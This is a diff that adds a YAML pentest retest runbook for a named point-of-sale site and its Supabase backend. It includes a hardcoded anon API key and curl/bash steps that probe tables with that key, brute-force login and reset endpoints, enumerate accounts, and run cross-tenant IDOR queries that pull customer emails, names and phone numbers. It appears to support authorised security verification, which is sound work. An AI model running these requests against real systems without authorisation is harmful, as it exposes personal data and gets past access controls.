@@ -1,0 +1,229 @@
+# runbook — PT-2026-001 posusa.com retest playbook
+name: "PT-2026-001 Retest"
+description: "Revalidate all 22 findings for posusa.com pentest case PT-2026-001"
+version: "1.0"
+target_required: false
+
+vars:
+  supabase_ref: "gxfekezkktqalqxouybw"
+  supabase_url: "https://gxfekezkktqalqxouybw.supabase.co"
+  anon_key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd4ZmVrZXpra3RxYWxxeG91eWJ3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUxMzI4MTcsImV4cCI6MjA4MDcwODgxN30.JVLoZS9PENUDAlwPFQV8thJnDzBfk_LPo_hAaq2sDOI"
+
+steps:
+  - id: setup
+    type: log
+    message: "Starting PT-2026-001 retest runbook"
+
+  - id: f0008_anon_key_access
+    name: "F0008/F0019 - Anon key access to Supabase tables"
+    type: parallel
+    steps:
+      - id: orders_anon
+        name: "Orders table via anon key"
+        tool: curl
+        args: ["-s", "-o", "/dev/null", "-w", "%{http_code}",
+               "{supabase_url}/rest/v1/orders?limit=1",
+               "-H", "apikey: {anon_key}",
+               "-H", "Content-Type: application/json"]
+        timeout: 15
+      - id: products_anon
+        name: "Products table via anon key"
+        tool: curl
+        args: ["-s", "-o", "/dev/null", "-w", "%{http_code}",
+               "{supabase_url}/rest/v1/products?limit=1",
+               "-H", "apikey: {anon_key}",
+               "-H", "Content-Type: application/json"]
+        timeout: 15
+      - id: categories_anon
+        name: "Categories table via anon key"
+        tool: curl
+        args: ["-s", "-o", "/dev/null", "-w", "%{http_code}",
+               "{supabase_url}/rest/v1/categories?limit=1",
+               "-H", "apikey: {anon_key}",
+               "-H", "Content-Type: application/json"]
+        timeout: 15
+      - id: invoices_anon
+        name: "Invoices table via anon key"
+        tool: curl
+        args: ["-s", "-o", "/dev/null", "-w", "%{http_code}",
+               "{supabase_url}/rest/v1/invoices?limit=1",
+               "-H", "apikey: {anon_key}",
+               "-H", "Content-Type: application/json"]
+        timeout: 15
+      - id: promo_codes_anon
+        name: "Promo codes table via anon key"
+        tool: curl
+        args: ["-s", "-o", "/dev/null", "-w", "%{http_code}",
+               "{supabase_url}/rest/v1/promo_codes?limit=1",
+               "-H", "apikey: {anon_key}",
+               "-H", "Content-Type: application/json"]
+        timeout: 15
+
+  - id: f0009_info_disclosure
+    name: "F0009 - Auth settings disclosure"
+    tool: curl
+    args: ["-s", "https://auth.posusa.com/auth/v1/settings",
+           "-H", "apikey: {anon_key}",
+           "-H", "Content-Type: application/json"]
+    timeout: 15
+
+  - id: f0010_login_rate_limit
+    name: "F0010 - Login rate limiting test"
+    type: parallel
+    steps:
+      - id: attempt_1
+        name: "Login attempt 1"
+        tool: curl
+        args: ["-s", "-o", "/dev/null", "-w", "%{http_code}",
+               "-X", "POST", "https://auth.posusa.com/auth/v1/token?grant_type=password",
+               "-H", "Content-Type: application/json",
+               "-H", "apikey: {anon_key}",
+               "-d", '{"email":"test@retest.com","password":"WrongPass123!"}']
+        timeout: 15
+      - id: attempt_5
+        name: "Login attempt 5 (check for 429)"
+        tool: bash
+        command: |
+          for i in $(seq 1 5); do
+            curl -s -o /dev/null -w "Attempt $i: %{http_code}\n" \
+              -X POST "https://auth.posusa.com/auth/v1/token?grant_type=password" \
+              -H "Content-Type: application/json" \
+              -H "apikey: {anon_key}" \
+              -d '{"email":"test@retest.com","password":"WrongPass123!"}'
+          done
+        timeout: 30
+
+  - id: f0011_username_enum
+    name: "F0011 - Username enumeration"
+    type: parallel
+    steps:
+      - id: enum_existing
+        name: "Signup with existing email"
+        tool: curl
+        args: ["-s", "-w", "\nHTTP_CODE: %{http_code}",
+               "-X", "POST", "https://auth.posusa.com/auth/v1/signup",
+               "-H", "Content-Type: application/json",
+               "-H", "apikey: {anon_key}",
+               "-d", '{"email":"pentest@feemcotech.solutions","password":"CorrectHorseBatteryStaple99!"}']
+        timeout: 15
+      - id: enum_new
+        name: "Signup with new email"
+        tool: curl
+        args: ["-s", "-w", "\nHTTP_CODE: %{http_code}",
+               "-X", "POST", "https://auth.posusa.com/auth/v1/signup",
+               "-H", "Content-Type: application/json",
+               "-H", "apikey: {anon_key}",
+               "-d", '{"email":"retest_$(date +%s)@test.com","password":"CorrectHorseBatteryStaple99!"}']
+        timeout: 15
+
+  - id: f0012_password_reset
+    name: "F0012 - Password reset rate limiting (verify fixed)"
+    tool: bash
+    command: |
+      for i in 1 2 3; do
+        echo -n "Attempt $i: "
+        curl -s -o /dev/null -w "%{http_code}" \
+          -X POST "https://auth.posusa.com/auth/v1/recover" \
+          -H "Content-Type: application/json" \
+          -H "apikey: {anon_key}" \
+          -d '{"email":"pentest@feemcotech.solutions"}'
+        echo
+      done
+    timeout: 30
+
+  - id: f0005_signup
+    name: "F0005/F0014 - Open signup test"
+    tool: curl
+    args: ["-s",
+           "-X", "POST", "https://auth.posusa.com/auth/v1/signup",
+           "-H", "Content-Type: application/json",
+           "-H", "apikey: {anon_key}",
+           "-d", '{"email":"retest_open_$(date +%s)@test.com","password":"RetestOpenSignup99!"}']
+    timeout: 15
+
+  - id: extract_token
+    type: log
+    message: "Register a new test account first using F0005 step, then extract access_token to use below"
+
+  - id: f0001_idor_merchants
+    name: "F0001/F0013 - Authd IDOR: cross-tenant merchant access"
+    tool: bash
+    command: |
+      TOKEN="$1"
+      echo "--- Merchants via authd user ---"
+      curl -s "{supabase_url}/rest/v1/merchants?select=count" \
+        -H "apikey: {anon_key}" \
+        -H "Authorization: Bearer $TOKEN"
+      echo
+      curl -s "{supabase_url}/rest/v1/merchants?limit=3&select=business_name,email" \
+        -H "apikey: {anon_key}" \
+        -H "Authorization: Bearer $TOKEN"
+    timeout: 15
+
+  - id: f0007_orders_idor
+    name: "F0007 - Authd IDOR: customer PII in orders"
+    tool: bash
+    command: |
+      TOKEN="$1"
+      curl -s "{supabase_url}/rest/v1/orders?limit=3&select=id,customer_email,customer_name,stripe_session_id,merchant_id" \
+        -H "apikey: {anon_key}" \
+        -H "Authorization: Bearer $TOKEN"
+    timeout: 15
+
+  - id: f0004_invoice_pii
+    name: "F0004 - Customer PII in invoices"
+    tool: bash
+    command: |
+      TOKEN="$1"
+      curl -s "{supabase_url}/rest/v1/invoices?limit=3&select=id,customer_email,customer_phone" \
+        -H "apikey: {anon_key}" \
+        -H "Authorization: Bearer $TOKEN"
+    timeout: 15
+
+  - id: f0006_merchants_anon
+    name: "F0006 - Merchants anon key (verify still 401)"
+    tool: curl
+    args: ["-s", "-o", "/dev/null", "-w", "%{http_code}",
+           "{supabase_url}/rest/v1/merchants?limit=1",
+           "-H", "apikey: {anon_key}",
+           "-H", "Content-Type: application/json"]
+    timeout: 15
+
+  - id: f0018_stripe_checkout
+    name: "F0018 - Stripe checkout endpoint (verify 404)"
+    tool: curl
+    args: ["-s", "-o", "/dev/null", "-w", "%{http_code}",
+           "-X", "POST", "https://app.posusa.com/api/stripe/checkout",
+           "-H", "Content-Type: application/json",
+           "-d", '{"merchant_id":"test","amount":500,"items":[{"name":"test","price":500}]}']
+    timeout: 15
+
+  - id: f0015_mfa
+    name: "F0015 - MFA check (JWT aal claim)"
+    tool: bash
+    command: |
+      echo "Decode JWT and check aal claim"
+    timeout: 10
+
+  - id: f0016_f0017_api_endpoints
+    name: "F0016/F0017 - API endpoint discovery check"
+    type: parallel
+    steps:
+      - id: admin_endpoint
+        name: "Admin API endpoint"
+        tool: curl
+        args: ["-s", "-o", "/dev/null", "-w", "%{http_code}",
+               "https://app.posusa.com/api/admin/merchants"]
+        timeout: 15
+      - id: notify_signup
+        name: "Notify-signup endpoint"
+        tool: curl
+        args: ["-s", "-o", "/dev/null", "-w", "%{http_code}",
+               "-X", "POST", "https://app.posusa.com/api/notify-signup",
+               "-H", "Content-Type: application/json",
+               "-d", '{}']
+        timeout: 15
+
+  - id: summary
+    type: log
+    message: "Retest complete — check results against expected statuses in F0024"
